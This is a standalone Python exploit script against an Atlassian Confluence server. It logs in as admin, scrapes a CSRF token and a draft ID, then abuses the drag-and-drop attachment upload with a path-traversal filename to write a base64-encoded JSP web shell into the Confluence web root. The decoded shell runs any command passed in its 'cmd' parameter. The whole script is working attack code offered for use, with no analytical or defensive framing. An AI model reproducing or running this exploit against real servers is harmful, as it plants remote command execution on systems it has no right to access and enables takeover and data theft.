#!/usr/bin/python3.6

import requests
from bs4 import BeautifulSoup
import base64

url = 'http://127.0.0.1:8090/'

values = {'os_username':'admin',
'os_password':'password',
'login':'Log+in',
'os_destination':''}

headers = {
    'accept': '*/*',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
}

jspshell = 'PCVAIHBhZ2UKaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT4KPCUKJT4KPEhUTUw+CjxCT0RZPgo8SDM+SlNQIFNIRUxMPC9IMz4KPEZPUk0gTUVUSE9EPSJHRVQiIE5BTUU9Im15Zm9ybSIKQUNUSU9OPSIiPgo8SU5QVVQgVFlQRT0idGV4dCIgTkFNRT0iY21kIj4KPElOUFVUIFRZUEU9InN1Ym1pdCIgVkFMVUU9IkV4ZWN1dGUiPgo8L0ZPUk0+CjxQUkU+CjwlCmlmIChyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgIT0gbnVsbCkgewpvdXQucHJpbnRsbigiQ29tbWFuZDogIiArCnJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSArICI8QlI+Iik7ClByb2Nlc3MgcCA9ClJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKT3V0cHV0U3RyZWFtIG9zID0gcC5nZXRPdXRwdXRTdHJlYW0oKTsKSW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7CkRhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsKU3RyaW5nIGRpc3IgPSBkaXMucmVhZExpbmUoKTsKd2hpbGUgKCBkaXNyICE9IG51bGwgKSB7Cm91dC5wcmludGxuKGRpc3IpOwpkaXNyID0gZGlzLnJlYWRMaW5lKCk7Cn0KfQolPgo8L1BSRT4KPC9CT0RZPgo8L0hUTUw+Cg=='

session = requests.Session()

login = session.post(url + 'dologin.action', headers=headers, data=values)

soup = BeautifulSoup(login.text, 'html.parser')

csrf_token = soup.select_one('meta[name="atlassian-token"]').get('content',None)

createpage = session.get(url + 'pages/createpage.action')

soup = BeautifulSoup(createpage.text, 'html.parser')

draft_id = soup.select_one('meta[name="ajs-draft-id"]').get('content',None)

attach = session.post(url + 'plugins/drag-and-drop/upload.action?draftId=' + draft_id + '&filename=../../../../../../opt/atlassian/confluence/confluence/shell.jsp&size=637&mimeType=text%2fplain&atl_token=' + csrf_token, headers=headers,data=base64.b64decode(jspshell))

downloadallattachments = session.get(url + 'pages/downloadallattachments.action?pageId=' + draft_id, headers=headers)

if downloadallattachments.status_code == 200:
    print('Success! Go to ' + url + 'shell.jsp for your shell!')
else:
    print('Something went wrong. Blame python.')

